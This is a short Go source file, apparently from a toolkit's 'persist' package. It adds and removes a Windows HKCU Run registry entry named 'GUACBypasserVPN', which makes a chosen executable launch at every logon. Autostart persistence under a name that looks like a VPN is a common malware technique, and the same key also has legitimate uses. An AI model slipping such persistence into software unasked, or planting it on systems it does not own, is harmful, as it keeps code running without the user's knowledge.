// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package persist

import "golang.org/x/sys/windows/registry"

type ExecutorHkcu struct{}

func (e ExecutorHkcu) Exec(path string) error {
	k, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.SetStringValue("GUACBypasserVPN", path)
	return err
}

func (e ExecutorHkcu) Revert() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()
	err = k.DeleteValue("GUACBypasserVPN")
	return err
}
